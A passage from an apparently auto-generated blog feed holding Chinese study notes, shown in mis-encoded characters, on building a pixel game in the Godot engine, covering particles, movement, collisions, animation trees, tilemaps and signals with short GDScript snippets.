ç²’å­ç‰¹æ•ˆ"></a>æ·»åŠ ç²’å­ç‰¹æ•ˆ</h2><p>ä½¿ç”¨ Particles2D èŠ‚ç‚¹.</p><p>ä¿®æ”¹ particle æ•°é‡ï¼Œå³è¾¹æ  Amount, è¿™é‡Œæ”¹æˆ 10.</p><p>éœ€è¦æ–°å»ºæè´¨: å³è¾¹æ  Process Material -&gt; New ParticlesMaterial</p><p>éœ€è¦å°†é‡åŠ›è°ƒä¸ºé›¶: å³è¾¹æ  Gravity -&gt; 0,0,0</p><p>è°ƒæ•´é‡å½±ä»åŠé€æ˜åˆ°é€æ˜çš„é¢œè‰²æ¸å˜: å³è¾¹æ  -&gt; Color -&gt; Color Ramp -&gt; GradientTexture -&gt; Gradient -&gt; New Gradient ç‚¹å‡»è¿›å…¥åçœ‹ä¸‹æ–¹.</p><p>å›åˆ° Particles2D, å³è¾¹æ  Textures -&gt; Texture, æ·»åŠ å›¾ç‰‡. å°† Drawing -&gt; Local Conrds å–æ¶ˆå‹¾é€‰.</p><p>åˆå›åˆ° Material é‡Œé¢æ·»åŠ ç¼©æ”¾æ›²çº¿. Scale -&gt; Scale Curve</p><h1 id="1-Setting-up-the-project"><a href="#1-Setting-up-the-project" class="headerlink" title="1. Setting up the project"></a>1. Setting up the project</h1><p>æ¯ä¸€ä¸ªæ¸¸æˆçš„è¿è¡Œçª—å£å¤§å°ä¸åŒï¼Œéœ€è¦æå‰è®¾ç½®.</p><p>å¼€å¯ Stretch ä¸‹çš„ Mode -&gt; 2D å’Œ Aspect -&gt; keep. å¯ä»¥å°†çª—å£å¤§å°ä¿æŒåœ¨ä½ è®¾å®šçš„å¤§å°è€Œä¸ä¼šéšç€æ‹‰ä¼¸å˜åŒ–. </p><p>åˆ›å»ºä¸‰ä¸ªç‹¬ç«‹çš„ scenes:</p><ul><li>Player</li><li>Mod</li><li>HUD</li></ul><p>è¿˜ä¼šæœ‰ä¸€ä¸ª Main scene.</p><h1 id="2-Creating-the-player-scene"><a href="#2-Creating-the-player-scene" class="headerlink" title="2. Creating the player scene"></a>2. Creating the player scene</h1><p>ç‹¬ç«‹å‡ºä¸€ä¸ª Player scene çš„å¥½å¤„å¥½å¤„åœ¨äºå¯ä»¥å•ç‹¬æµ‹è¯•.</p>]]></content>
    
    
    <categories>
      
      <category>Godot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Godot-åˆ¶ä½œ-åƒç´ æ¸¸æˆ-Bç«™æ•™ç¨‹-Notes</title>
    <link href="/2022/11/13/Godot-%E5%88%B6%E4%BD%9C-%E5%83%8F%E7%B4%A0%E6%B8%B8%E6%88%8F-B%E7%AB%99%E6%95%99%E7%A8%8B-Notes/"/>
    <url>/2022/11/13/Godot-%E5%88%B6%E4%BD%9C-%E5%83%8F%E7%B4%A0%E6%B8%B8%E6%88%8F-B%E7%AB%99%E6%95%99%E7%A8%8B-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV15D4y1U7j5/?spm_id_from=333.880.my_history.page.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ</a></p><h1 id="P1-æœ€åæˆæœã€èµ„æºå¯¼å…¥ã€é¡¹ç›®è®¾ç½®ã€è§’è‰²ç§»åŠ¨åŸºç¡€"><a href="#P1-æœ€åæˆæœã€èµ„æºå¯¼å…¥ã€é¡¹ç›®è®¾ç½®ã€è§’è‰²ç§»åŠ¨åŸºç¡€" class="headerlink" title="P1. æœ€åæˆæœã€èµ„æºå¯¼å…¥ã€é¡¹ç›®è®¾ç½®ã€è§’è‰²ç§»åŠ¨åŸºç¡€"></a>P1. æœ€åæˆæœã€èµ„æºå¯¼å…¥ã€é¡¹ç›®è®¾ç½®ã€è§’è‰²ç§»åŠ¨åŸºç¡€</h1><p>å°†ä¸»åœºæ™¯ä¿å­˜åœ¨å·¥ä½œç›®å½•ä¸‹çš„æ ¹ç›®å½•ï¼Œè€Œä¸æ˜¯å­ç›®å½•.</p><p>è¿è¡Œæ¸¸æˆä¹‹å‰è¦é€‰æ‹©ä¸€ä¸ªåœºæ™¯ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ª <code>.tscn</code> æ–‡ä»¶, <code>scn</code> åº”è¯¥æ˜¯ sceen çš„ç¼©å†™.</p><p>éœ€è¦è®¾ç½®æ›´é€‚åˆåƒç´ é£çš„çª—å£å¤§å°ï¼Œåœ¨ Project -&gt; Project Setting -&gt; Display -&gt; Window ä¸‹è®¾ç½®.</p><p>å¦‚:<br><img src="/../img/size_to_suit_pixel.png"></p><p>è¿˜éœ€è¦ä¿®æ”¹ä¸‹é¢çš„ Stretch -&gt; Mode -&gt; 2D</p><p>åœºæ™¯æ˜¯ nodes çš„é›†åˆ. nodes æ˜¯æŒ‚è½½åœ¨åœºæ™¯ä¹‹ä¸‹çš„. nodes ä¸ºæ ‘çŠ¶.</p><p>å­—èŠ‚ç‚¹çš„ç§»åŠ¨æ˜¯ç›¸å¯¹äºçˆ¶èŠ‚ç‚¹çš„.</p><p>é€‰æ‹© KinematicBody2D ä½œä¸ºè§’è‰²çš„èŠ‚ç‚¹. å…¶ä¸ºç‰©ç†ç¢°æ’ä½“.</p><p>StaticBody ç”¨äºæ¸¸æˆä¸­ä¸ä¼šç§»åŠ¨çš„ç‰©ä½“.</p><p>RigidBody ç”¨äºä½¿ç”¨ç‰©ç†ç³»ç»Ÿè¿åŠ¨çš„ç‰©ä½“.</p><p>ä¸€ä¸ªæ˜¾ç¤ºäº†å¾ˆå¤šå¸§çš„å›¾ç‰‡ï¼Œå¯ä»¥é€šè¿‡è°ƒæ•´å³ä¾§è¾¹æ çš„ Animation -&gt; Hframes å°†å…¶åˆå¹¶. Hframes ä¸­çš„ H æ˜¯ Horizontal.</p><p>å°†è„šæœ¬åˆ›å»ºåˆ°ä¸å›¾ç‰‡åŒä¸€ä¸ªæ–‡ä»¶å¤¹å¹¶æŒ‚è½½.</p><p>è„šæœ¬åŸºäºå“ªä¸€ä¸ªèŠ‚ç‚¹åˆ›å»ºçš„å°±ç»§æ‰¿å“ªä¸€ä¸ªèŠ‚ç‚¹çš„å¯¹è±¡, æ—¥:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">extends</span> <span class="hljs-title class_">KinematicBody2D</span><br></code></pre></td></tr></table></figure><p>æ¯”å¦‚è¿™ä¸ªè„šæœ¬æŒ‚è½½åˆ°ä¸€ä¸ª KinematicBody2D node ä¹‹ä¸‹ï¼Œå½“åœºæ™¯ä¸­çš„è¿™ä¸ªèŠ‚ç‚¹å‡†å¤‡å°±ç»ªæ—¶ï¼Œready å‡½æ•°å°±è¿è¡Œ.</p><p><code>_physic_process(delta)</code> å‡½æ•°åœ¨æ¯æ¬¡ç‰©ç†å¼•æ“æ›´æ–°æ—¶è°ƒç”¨.</p><p><code>delta</code> å˜é‡æ˜¯ä¸€ä¸ªæ’å®šå¸¸é‡ï¼ŒæŒ‡ä¸Šä¸€å¸§èŠ±è´¹çš„æ—¶é—´.</p><p>ä»»ä½•ä¸æ‡‚çš„ä»£ç å¯ä»¥ç›´æ¥åœ¨ Search Help ä¸­æœç´¢.</p><p>è·å–è¾“å…¥ä½¿ç”¨ <code>Input</code>, è¦è®©äººç‰©ç§»åŠ¨ï¼Œéœ€è¦ä½¿ç”¨ <code>move_and_collide(velocity)</code> å‡½æ•°.</p><p><code>Vector2.ZERO</code> çš„å«ä¹‰å°±æ˜¯ (0, 0).</p><h1 id="P2-å…³äºdeltaã€ä¼˜åŒ–ç§»åŠ¨"><a href="#P2-å…³äºdeltaã€ä¼˜åŒ–ç§»åŠ¨" class="headerlink" title="P2. å…³äºdeltaã€ä¼˜åŒ–ç§»åŠ¨"></a>P2. å…³äºdeltaã€ä¼˜åŒ–ç§»åŠ¨</h1><p><mark>å›è°ƒå‡½æ•°</mark> , å›è°ƒå®é™…ä¸Šå°±æ˜¯é‡å¤æ‰§è¡Œè¿™ä¸ªå‡½æ•°.</p><p><code>_physic_process</code> ä¸­ <code>delta</code> çš„å€¼ä¸ä¼šå˜ï¼Œä¸€ç›´æ˜¯ 1&#x2F;60 (ä¹Ÿå°±æ˜¯è¯´å›ºå®š 1&#x2F;60 ç§’è°ƒç”¨ä¸€æ¬¡). è¦åŒºåˆ†å…¶å’Œ <code>_process</code> ä¸­çš„ <code>delta</code>.</p><ul><li><code>_physic_process</code> å’ŒçœŸå®æ—¶é’ŸåŒæ­¥. æ˜¯å›ºå®šçš„ã€‚</li><li><code>_process</code> å’Œè¿è¡Œçš„å¸§ç‡æœ‰å…³</li></ul><p>é€Ÿåº¦ä¹˜ä»¥ <code>delta</code> çš„ç›®çš„æ˜¯å°†é€Ÿåº¦ä» x æ¯å¸§å˜æˆ x æ¯ç§’.</p><p>åŸæœ¬ï¼Œä¸€å¸§å¤„ç†å®Œä¹‹åï¼Œç‰©ä½“æ‰ä¼šä»ä¸€ä¸ªä½ç½®ç§»åŠ¨åˆ°å¦ä¸€ä¸ªä½ç½®.</p><p>ä½¿ç”¨ Vector2 å¯¹è±¡çš„æˆå‘˜å‡½æ•° <code>normalized()</code>, è¿”å›ä¸€ä¸ª unit vector.</p><p>æ¨¡æ‹Ÿæ‘©æ“¦åŠ›éœ€è¦ç”¨åˆ° <code>move_toward()</code> æˆå‘˜å‡½æ•°ï¼Œç†è§£ä¸ºå‘è¿™ä¸ªç»™å®šçš„å‘é‡é è¿‘, åé¢åŠ é€Ÿç‡.</p><p>è®¾å®šæœ€å¤§é€Ÿåº¦ç”¨ <code>limit_length()</code> æˆå‘˜å‡½æ•°:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">velocity</span> <span class="hljs-operator">=</span> velocity.limit_length(MAX_SPEED * delta)<br></code></pre></td></tr></table></figure><h1 id="P3-ç¢°æ’ã€move-and-slide"><a href="#P3-ç¢°æ’ã€move-and-slide" class="headerlink" title="P3. ç¢°æ’ã€move_and_slide()"></a>P3. ç¢°æ’ã€move_and_slide()</h1><p>ç»™ KinematicBody2D æ·»åŠ ç¢°æ’. ç‚¹å‡» KinematicBody2D èŠ‚ç‚¹ç„¶åæ·»åŠ  CollisionShape2D èŠ‚ç‚¹.</p><p>åœ¨å³ä¾§è¾¹æ é€‰æ‹©å½¢çŠ¶ CollisionShape2D -&gt; Shape</p><p>é€‰ä¸­å­èŠ‚ç‚¹åæŒ‰ä½ Alt å¯ä»¥åªç§»åŠ¨å­èŠ‚ç‚¹.</p><p>å¯ä»¥ç»™ StaticBody2D æ·»åŠ  CollisionPolygon2D, ç„¶åå¯ä»¥è‡ªå·±ç”»å‡ºå½¢çŠ¶. (åˆ©ç”¨ä¸Šè¾¹æ å¤šå‡ºçš„é€‰é¡¹)</p><p>ç”»å‡ºå CollisionShape è¿˜ä¸å¯è§ï¼Œéœ€è¦åœ¨å·¦ä¸Šè§’è¾¹æ é‡Œçš„ Debug -&gt; Visible Collision Shapes æ‰“å¼€.</p><p>ä½¿ç”¨ <code>move_and_collide()</code> å‡½æ•°ä¸èƒ½è®©ä½ æ²¿ç€ç¢°æ’ä½“æ»‘åŠ¨. å¯ä»¥ä½¿ç”¨ <code>move_and_slide()</code> è§£å†³ï¼Œä½†æ˜¯éœ€è¦å»é™¤ delta.</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">velocity</span> <span class="hljs-operator">=</span> move_and_slide(velocity)<br></code></pre></td></tr></table></figure><p>è®¾ç½® Window -&gt; Stretch -&gt; Aspect -&gt; keep.</p><h1 id="P4-åœºæ™¯ã€YSortèŠ‚ç‚¹"><a href="#P4-åœºæ™¯ã€YSortèŠ‚ç‚¹" class="headerlink" title="P4. åœºæ™¯ã€YSortèŠ‚ç‚¹"></a>P4. åœºæ™¯ã€YSortèŠ‚ç‚¹</h1><h2 id="è®²è§£éƒ¨åˆ†"><a href="#è®²è§£éƒ¨åˆ†" class="headerlink" title="è®²è§£éƒ¨åˆ†"></a>è®²è§£éƒ¨åˆ†</h2><p>Godot å¯ä»¥ä»å·²æœ‰åœºæ™¯ä¸­çš„èŠ‚ç‚¹æ¥åˆ›å»ºæ–°çš„èŠ‚ç‚¹. (å°†ä¸€ä¸ªèŠ‚ç‚¹è®¾ç½®ä¸ºä¸€ä¸ªå•ç‹¬çš„ scene, ç„¶åæ‹–æ‹½åˆ°æ–°çš„åœºæ™¯ä¸­)</p><p>ç‚¹å‡»ä¸€ä¸ªèŠ‚ç‚¹ -&gt; Save Branch as Scene. å…ˆæŠŠå³ä¾§è¾¹æ ä¸­çš„ Transform ä¸‹çš„åæ ‡è®¾ç½®ä¸º (0, 0), ä¸ç„¶ä½ æ”¾ç½®çš„ä½ç½®æ˜¯ç›¸å¯¹åŸç‚¹, è€Œä¸æ˜¯å‡†ç¡®çš„ä½ æƒ³è¦çš„ä½ç½®.</p><p>å°†ä¸€ä¸ªç‰©ä½“è®¾ç½®ä¸ºå•ç‹¬çš„åœºæ™¯æ–¹ä¾¿ç®¡ç†.</p><p>åˆ©ç”¨ YSortèŠ‚ç‚¹ æ¥æ˜¾ç¤ºå±‚æ¬¡å…³ç³». å…¶åˆ¤æ–­è°åœ¨è¡¨é¢è°åœ¨ä¸‹é¢æ˜¯é€šè¿‡ä¸­å¿ƒç‚¹çš„ Y å€¼.</p><p><img src="/../img/Ysort_center_of_obj1.png"><br><img src="/../img/Ysort_center_of_obj2.png"></p><p>å¯ä»¥çœ‹åˆ° Y å€¼å¤§çš„åœ¨è¡¨é¢.</p><p>ç‚¹å‡»ä¸€ä¸ªèŠ‚ç‚¹ï¼Œç„¶å Change Type -&gt; Ysort.</p><h2 id="æ­¥éª¤æ€»ç»“"><a href="#æ­¥éª¤æ€»ç»“" class="headerlink" title="æ­¥éª¤æ€»ç»“"></a>æ­¥éª¤æ€»ç»“</h2><p>åœ¨ä¸€ä¸ªèŠ‚ç‚¹ä¸‹æ·»åŠ åœºæ™¯:</p><ol><li>åˆ›å»ºä¸€ä¸ªèŠ‚ç‚¹ï¼Œé€‰ä¸­è¿™ä¸ªèŠ‚ç‚¹ </li><li>å°†åœºæ™¯æ‹–æ‹½åˆ°åœ°å›¾ä¸­ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªåœºæ™¯æŒ‚è½½åˆ°äº†è¿™ä¸ªèŠ‚ç‚¹ä¸‹. (ä¸€ä¸ªåœºæ™¯å°±æ˜¯èŠ‚ç‚¹çš„é›†åˆ)</li></ol><h1 id="P5-è§’è‰²åŠ¨ç”»-AnimationPlayer"><a href="#P5-è§’è‰²åŠ¨ç”»-AnimationPlayer" class="headerlink" title="P5. è§’è‰²åŠ¨ç”»-AnimationPlayer"></a>P5. è§’è‰²åŠ¨ç”»-AnimationPlayer</h1><h2 id="è®²è§£éƒ¨åˆ†-1"><a href="#è®²è§£éƒ¨åˆ†-1" class="headerlink" title="è®²è§£éƒ¨åˆ†"></a>è®²è§£éƒ¨åˆ†</h2><p>ç»™è§’è‰²çš„èŠ‚ç‚¹æ·»åŠ  AnimationPlayer èŠ‚ç‚¹.</p><p>ç‚¹å‡» AnimationPlayer èŠ‚ç‚¹ï¼Œåœ¨ä¸‹è¾¹æ ä¸­ç‚¹å‡» Animation -&gt; New</p><p>Snap æ˜¯æ¯ä¸€å¸§çš„é—´éš”æ—¶é—´, å³ä¸Šè§’ä¾§æ˜¯æ€»æ—¶é—´. å³ä¸‹è§’å¯ä»¥è°ƒæ•´ timeline.</p><p>å¯ä»¥åœ¨ç¼–è¾‘å™¨ä¸­é¢„è§ˆåŠ¨ç”».</p><p>åœ¨ Player è„šæœ¬å†…è®¿é—® AnimationPlayer èŠ‚ç‚¹.</p><p>å†™åœ¨ <code>_ready()</code> ä¸­, å¦‚:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">var animationPlayer = <span class="hljs-literal">null</span><br><br><span class="hljs-keyword">func</span> <span class="hljs-title function_">_ready</span><span class="hljs-params">()</span>:<br>    animationPlayer = $AnimationPlayer<br></code></pre></td></tr></table></figure><p><code>$</code> æ˜¯ <code>get_node()</code> çš„ç¼©å†™ï¼Œå¯ä»¥ç”¨æ¥è·å–æ ‘ä¸­çš„èŠ‚ç‚¹.</p><p>æˆ–è€…å†™æˆä¸éœ€è¦ <code>_ready()</code> å‡½æ•°çš„å½¢å¼:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">onready <span class="hljs-keyword">var</span> animationPlayer = <span class="hljs-symbol">$A</span>nimationPlayer<br></code></pre></td></tr></table></figure><p>å¯ä»¥æŸ¥çœ‹ AnimationPlayer çš„æ–‡æ¡£å¦‚ä½•ä½¿ç”¨ Animation.</p><p>ä½¿ç”¨ AnimationPlayer ç±»çš„æˆå‘˜å‡½æ•° <code>play()</code>, å…¶ä¸­ä¸€ä¸ªå‚æ•°æ˜¯åŠ¨ç”»å:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">animationPlayer.<span class="hljs-keyword">play</span>(<span class="hljs-string">&quot;IdleRight&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="æ­¥éª¤æ€»ç»“-1"><a href="#æ­¥éª¤æ€»ç»“-1" class="headerlink" title="æ­¥éª¤æ€»ç»“"></a>æ­¥éª¤æ€»ç»“</h2><h1 id="P6-åˆ©ç”¨-AnimationTree-è®¾ç½®è§’è‰²å››æ–¹å‘åŠ¨ç”»"><a href="#P6-åˆ©ç”¨-AnimationTree-è®¾ç½®è§’è‰²å››æ–¹å‘åŠ¨ç”»" class="headerlink" title="P6. åˆ©ç”¨ AnimationTree è®¾ç½®è§’è‰²å››æ–¹å‘åŠ¨ç”»"></a>P6. åˆ©ç”¨ AnimationTree è®¾ç½®è§’è‰²å››æ–¹å‘åŠ¨ç”»</h1><p>åœ¨ Play ä¸‹æ·»åŠ ä¸€ä¸ªèŠ‚ç‚¹ AnimationTree, éœ€è¦ç°åœ¨å³ä¾§è¾¹æ ä¸­ AnimationTree -&gt; Anim Player ä¸­ç»™å®ƒåˆ†é…ä¸€ä¸ª AnimationPlayer.</p><p>AnimationTree æœ‰å¾ˆå¤šä¸­ç»“æ„ï¼Œéœ€è¦åœ¨å³ä¾§è¾¹æ ä¸­é€‰æ‹© AnimationTree -&gt; Tree Root, è¿™é‡Œé€‰æ‹©çš„æ˜¯ AnimationNodeStateMachine.</p><p>åŒæ ·è¦å‹¾é€‰ Animation -&gt; Active -&gt; on, æ¥ activate è¿™ä¸ª tree.</p><p>åœ¨ä¸‹è¾¹æ ä¸­å³é”®å¯åˆ›å»ºåŠ¨ç”».</p><p>æ·»åŠ  Blendspace2D, è¿™ä¸ªèŠ‚ç‚¹çš„å«ä¹‰å¤§æ¦‚æ˜¯å°†å¤šä¸ªåŠ¨ç”»æ”¾åœ¨ä¸€èµ·ï¼Œé€šè¿‡ä¸€ä¸ªäºŒç»´å‘é‡æ¥åˆ¤æ–­æ’­æ”¾å“ªä¸€ä¸ª. æ³¨æ„è¿™é‡Œçš„åæ ‡ç³»å’ŒäºŒç»´æ¸¸æˆåæ ‡ç³»ä¸åŒ. åˆ‡æ¢åˆ°è™šçº¿æ¨¡å¼.</p><p>å¯ä»¥æ·»åŠ å‡ ä¸ª Blendspace2D åŠ¨ç”»çš„è½¬æ¢. å³ä»€ä¹ˆæ¡ä»¶ä¸‹ä»ä¸€ä¸ªåŠ¨ç”»åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªåŠ¨ç”».</p><p>å¦‚:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">animationTree.<span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;parameters/Idel/blend_position&quot;</span>, input_vector)<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªçš„å«ä¹‰å¤§æ¦‚æ˜¯è®¾ç½® â€œparameters&#x2F;Idel&#x2F;blend_positionâ€ è¿™ä¸ªåŠ¨ç”»ï¼Œç„¶åé€šè¿‡ <code>Input_vector</code> è¿™ä¸ªå‘é‡æ¥è®¾ç½® å‰è€…çš„å€¼.</p><p><code>set</code> ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ AnimationTree å³è¾¹æ çš„å‚æ•°.</p><h1 id="P7-è‰åœ°èƒŒæ™¯å’ŒAuto-Tile"><a href="#P7-è‰åœ°èƒŒæ™¯å’ŒAuto-Tile" class="headerlink" title="P7. è‰åœ°èƒŒæ™¯å’ŒAuto Tile"></a>P7. è‰åœ°èƒŒæ™¯å’ŒAuto Tile</h1><p>é‡æ–°è®¾ç½®ä¸€ä¸‹.</p><p><img src="/../img/reset_to_node2D.png"></p><p>ç¬¬ä¸€ä¸ªæ–¹æ³•è®¾ç½®èƒŒæ™¯:</p><p>è®¾ç½®ä¸€ä¸ª regon, ç‚¹å‡»å›¾ç‰‡ Import -&gt; Flags -&gt; Repeat -&gt; Enabled -&gt; reimport, ä¹‹åå…ˆåœ¨å³è¾¹æ  Regon -&gt; Enabled -&gt; on, ç„¶ååœ¨ä¸‹è¾¹æ  -&gt; Textureregion</p><p>ç¬¬äºŒä¸ªæ–¹æ³•ï¼Œæ·»åŠ ä¸€ä¸ª TextureRect èŠ‚ç‚¹. æ·»åŠ å›¾ç‰‡åï¼Œåœ¨å³è¾¹æ è®¾ç½® Stretch Mode -&gt; Tile, å°±ä¼šè‡ªåŠ¨å¹³é“º.</p><p>å…³äº Tile çš„éƒ¨åˆ†ï¼Œæ·»åŠ ä¸€ä¸ª TileMap èŠ‚ç‚¹, å…ˆè®¾ç½®ä¸€éƒ¨åˆ†ï¼Œåœ¨å³è¾¹æ  Cell -&gt; Size ä¸¤ä¸ª 16, ç„¶å TileMap -&gt; Tile Set -&gt; TileSet, ç‚¹å‡»è¿™ä¸ª TileSet å¯ä»¥çœ‹åˆ° Resource çš„å‚æ•°.</p><p>åœ¨ Tile é¢æ¿ä¸­ä¸€èˆ¬æ·»åŠ  Autotile</p><p>Bitmask çš„ä½œç”¨ä¸å¤ªæ¸…æ¥š.</p><p>Shift + F12 å¯ä»¥å°† TileMap å…¨å±ã€‚</p><h1 id="P8-Autotileç¢°æ’"><a href="#P8-Autotileç¢°æ’" class="headerlink" title="P8. Autotileç¢°æ’"></a>P8. Autotileç¢°æ’</h1><p>ç»™ä¸€äº› tile å¢åŠ ç¢°æ’çš„ç‰¹æ€§.</p><h1 id="P9-æ”»å‡»åŠ¨ç”»å’ŒState-Machine"><a href="#P9-æ”»å‡»åŠ¨ç”»å’ŒState-Machine" class="headerlink" title="P9. æ”»å‡»åŠ¨ç”»å’ŒState Machine"></a>P9. æ”»å‡»åŠ¨ç”»å’ŒState Machine</h1><h2 id="è®²è§£éƒ¨åˆ†-2"><a href="#è®²è§£éƒ¨åˆ†-2" class="headerlink" title="è®²è§£éƒ¨åˆ†"></a>è®²è§£éƒ¨åˆ†</h2><p>enum æ˜¯ä» 0 å¼€å§‹çš„.</p><p>è®¾ç½®é”®ä½: Project -&gt; Project Settings -&gt; Input_map, ç„¶åå°±å¯ä»¥è®¾ç½®, æ·»åŠ .</p><p>åŒæ ·æ·»åŠ åŠ¨ç”».</p><p>åœ¨åŠ¨ç”»çš„æœ€åä¸€å¸§æ·»åŠ ä¸€ä¸ª track: Add Track -&gt; Call Method Track, è¿™ä¸€å¸§ç”¨æ¥è°ƒç”¨ä¸€ä¸ªå‡½æ•°.</p><h2 id="æ€»ç»“æ­¥éª¤"><a href="#æ€»ç»“æ­¥éª¤" class="headerlink" title="æ€»ç»“æ­¥éª¤"></a>æ€»ç»“æ­¥éª¤</h2><p>æ·»åŠ å¹¶å¼•ç”¨åŠ¨ç”»çš„æ­¥éª¤:</p><ol><li>åˆ›å»ºä¸€ä¸ªèŠ‚ç‚¹, æ·»åŠ  Sprite èŠ‚ç‚¹ (æˆ– AnimatedSprite èŠ‚ç‚¹) å¹¶æ·»åŠ å«æœ‰å¤šå¸§ç”»é¢çš„å›¾åƒ</li><li>è‹¥æ˜¯ Sprite èŠ‚ç‚¹ï¼Œåˆ™å†æ·»åŠ ä¸€ä¸ª Animation èŠ‚ç‚¹å¦‚ AnimationPlayer, AnimationTree </li><li>è®¾ç½®åŠ¨ç”»</li><li>åœ¨æŒ‚è½½çš„è„šæœ¬ä¸­å¼•ç”¨åŠ¨ç”»ï¼Œå…ˆç”¨ <code>onready var animatedSprite = $AnimatedSprite</code> è¿™ç§å½¢å¼æ¥è·å–åŠ¨ç”»èŠ‚ç‚¹ (ä¸€ä¸ªå¯¹è±¡),</li></ol><h1 id="P10-ä¿¡å·ã€åœ¨ä»£ç ä¸­å¼•ç”¨åœºæ™¯"><a href="#P10-ä¿¡å·ã€åœ¨ä»£ç ä¸­å¼•ç”¨åœºæ™¯" class="headerlink" title="P10. ä¿¡å·ã€åœ¨ä»£ç ä¸­å¼•ç”¨åœºæ™¯"></a>P10. ä¿¡å·ã€åœ¨ä»£ç ä¸­å¼•ç”¨åœºæ™¯</h1><h2 id="è®²è§£éƒ¨åˆ†-3"><a href="#è®²è§£éƒ¨åˆ†-3" class="headerlink" title="è®²è§£éƒ¨åˆ†"></a>è®²è§£éƒ¨åˆ†</h2><p>ysort æ˜¯ç”¨çˆ¶èŠ‚ç‚¹æ¥æ’åºçš„.</p><p><code>_process(delta)</code> å’Œ <code>_physic_process(delta)</code> çš„åŒºåˆ«ï¼Œå‰è€…çš„ <code>delta</code> ä¸æ˜¯å¸¸é‡ï¼Œåè€…çš„ <code>delta</code> æ˜¯å¸¸é‡.</p><p><code>queue_free()</code> å‡½æ•°ï¼Œå°†èŠ‚ç‚¹æ·»åŠ åˆ°ä¸€ä¸ªä¼šè¢« free çš„é˜Ÿåˆ—ä¸­. æ³¨æ„å’Œ <code>free()</code> çš„åŒºåˆ«ï¼Œå‰è€…ä¸æ˜¯ç«‹å³æ¸…é™¤.</p><p>ç®€å•çš„åŠ¨ç”»ä½¿ç”¨ <code>AnimatedSprite</code> èŠ‚ç‚¹.</p><p>åœ¨ <code>AnimatedSprite</code> èŠ‚ç‚¹ä¸­çš„å³è¾¹æ ï¼Œåˆ‡æ¢åˆ° Node å¯ä»¥çœ‹åˆ° Signals</p><p>ä¿¡å·å¯ä»¥åœ¨æŸä¸ªäº‹ä»¶å‘ç”Ÿæ—¶è§¦å‘, å½“ä¸€ä¸ªä¿¡å·è§¦å‘æ—¶ (è¿æ¥åˆ°ä¸€ä¸ªå‡½æ•°å°±æ˜¯å½“è¿™ä¸ªå‡½æ•°è¿è¡Œæ—¶.)</p><p><code>load()</code> å‡½æ•°ï¼ŒåŠ è½½ä¸€ä¸ªåœºæ™¯.</p><p><code>instance()</code> å‡½æ•°ï¼Œç”¨åœºæ™¯åˆ›å»ºä¸€ä¸ªèŠ‚ç‚¹.</p><p>ç”¨ <code>get_tree().current_scene</code> æ¥è·å–å½“å‰åœºæ™¯çš„æ ¹èŠ‚ç‚¹.</p><p>èŠ‚ç‚¹ç”¨ <code>add_child()</code> æˆå‘˜å‡½æ•°å¯ä»¥æ·»åŠ å­èŠ‚ç‚¹. è¿™ä¸ªå­èŠ‚ç‚¹çš„ä½ç½®é»˜è®¤æ˜¯ (0, 0), å› æ­¤éœ€è¦æ·»åŠ ä½ç½®. å¦‚:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">grassEffect.global_position</span> = global_position<br></code></pre></td></tr></table></figure><p><code>global_position</code> åº”è¯¥æ˜¯é¢„å¤„ç†çš„å˜é‡. ä½ æŠŠä»£ç æŒ‚è½½åˆ°å“ªä¸€ä¸ªèŠ‚ç‚¹ï¼Œè¿™ä¸ªä½ç½®å°±æ˜¯å“ªä¸€ä¸ªèŠ‚ç‚¹çš„ä½ç½®.</p><p>Remote æ˜¯å½“å‰æ¸¸æˆè¿è¡Œçš„å³æ—¶åœºæ™¯.</p><h2 id="æ€»ç»“æ­¥éª¤-1"><a href="#æ€»ç»“æ­¥éª¤-1" class="headerlink" title="æ€»ç»“æ­¥éª¤"></a>æ€»ç»“æ­¥éª¤</h2><p>åŠ¨ç”»æ’­æ”¾åæ¶ˆå¤±:</p><ol><li>ç»™èŠ‚ç‚¹æŒ‚è½½è„šæœ¬</li><li>æ·»åŠ ä¿¡å· animation_finished</li><li>åœ¨è¿™ä¸ªä¿¡å·æä¾›çš„å‡½æ•°ä¸‹å†™åŠ¨ç”»æ’­æ”¾å®Œæ¯•åè¦åšçš„äº‹</li></ol><p>åœ¨ä¸€ä¸ªèŠ‚ç‚¹ä¸­å¼•ç”¨åœºæ™¯çš„æ­¥éª¤:</p><ol><li>é€‰æ‹©ä¸€ä¸ªèŠ‚ç‚¹çš„è„šæœ¬ (ä½ æƒ³æŠŠåœºæ™¯åŠ è½½åˆ°è¿™ä¸ªèŠ‚ç‚¹ä¸‹)ï¼ŒåŠ è½½åœºæ™¯ï¼Œå‚¨å­˜åœ¨å˜é‡é‡Œ</li><li>å¼•ç”¨è¯¥åœºæ™¯ï¼Œå‚¨å­˜åœ¨å˜é‡é‡Œ</li><li>æŠŠå¼•ç”¨æ·»åŠ 